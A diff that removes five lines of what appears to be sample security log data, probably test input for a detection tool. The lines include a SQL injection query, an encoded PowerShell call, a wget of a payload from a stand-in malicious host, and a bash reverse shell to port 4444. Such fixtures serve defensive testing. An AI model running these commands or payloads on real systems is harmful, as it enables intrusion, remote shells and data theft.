@@ -1,5 +1,0 @@
-Sep 12 11:02:12 server sshd[1001]: Failed password for invalid user root from 192.168.1.25 port 4455
-Sep 12 11:05:00 webserver GET /index.php?id=1 UNION SELECT user, pass FROM users
-Sep 12 11:06:00 client powershell.exe -EncodedCommand QWJjMTIz
-Sep 12 11:10:45 system wget http://malicious.com/payload.sh
-Sep 12 11:15:12 system /bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
